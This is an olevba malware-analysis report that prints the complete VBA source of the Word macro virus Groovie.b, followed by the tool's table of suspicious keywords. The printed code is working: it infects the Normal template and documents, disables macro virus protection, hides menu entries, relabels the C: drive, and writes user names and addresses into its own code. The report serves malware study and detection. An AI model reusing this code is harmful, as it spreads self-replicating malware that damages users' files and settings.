olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-18b9dff5f87376ad387a38a526dadf05b7acfa9e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-18b9dff5f87376ad387a38a526dadf05b7acfa9e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-18b9dff5f87376ad387a38a526dadf05b7acfa9e - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' SK6/11/99 6:39:51 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I02 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I03 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I04 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I05 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I06 As String
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I07 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Public I08 As Boolean
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I09()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If MacroContainer = NormalTemplate Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        I01 = "normal"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        GoTo checkout
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
checkout:
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I10()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Next i
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Next i
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I11()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I09
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I10
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I01 = "document" Then Call I12
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I01 = "normal" Then Call I13
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I01 = "orbit" Then Call I14
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I12()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I03 = False And I05 = False Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        With NormalTemplate.VBProject
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        With .VBComponents.Import("c:\groovie.sys")
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I02 = False Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If I08 = False Then Documents.Open FileName:=I06
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Shell ("label c: groovie"), 0
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Windows(1).Close
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I13()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Application.ScreenUpdating = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Call I17
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I04 = False And I07 = True Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        With ActiveDocument.VBProject
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        With .VBComponents.Import("c:\groovie.sys")
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        With Dialogs(wdDialogFileSummaryInfo)
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            .Comments = "ALT-F11 says it's groovie!"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            .Execute
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I02 = False And I07 = True Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If I08 = False Then Documents.Open FileName:=I06
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If I02 = False And I07 = False Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Documents.Add Template:="", NewTemplate:=False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Application.ScreenUpdating = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I14()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Application.ScreenUpdating = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If I03 = False And I05 = False Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            With NormalTemplate.VBProject
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            With .VBComponents.Import("c:\groovie.sys")
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            NormalTemplate.Save
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        If I04 = False Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            With ActiveDocument.VBProject
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            With .VBComponents.Import("c:\groovie.sys")
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            With Dialogs(wdDialogFileSummaryInfo)
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
                .Comments = "ALT-F11 says it's groovie!"
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
                .Execute
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
            End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Application.ScreenUpdating = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I15()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Options.VirusProtection = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Options.SaveNormalPrompt = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Options.ConfirmConversions = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    I06 = ActiveDocument.FullName
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    Call I11
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub AutoClose()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
I08 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub AutoExit()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub FileSaveAs()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I16
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Dialogs(wdDialogFileSaveAs).Show
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub filesave()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I16
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub fileclose()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
I08 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
ActiveDocument.Close
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub fileprint()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error Resume Next
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Call I15
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Dialogs(wdDialogFilePrint).Show
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub ViewVBCode()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub ToolsMacro()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Sub FileTemplates()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Sub
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I17()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
On Error GoTo docek
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    If ActiveDocument.Name <> "" Then
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
        I07 = True
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    End If
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    GoTo over
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
docek:
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
    I07 = False
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
over:
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Function I16()
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Randomize
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
rn = Int(Rnd * 999)
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
For x = 2 To 358 Step 2
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
.deletelines x
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
Next x
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End With
 ' SK6/11/99 6:39:52 PM582Santhosh Kumar582HP DeskJet 890c on \\LAB4\890C
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

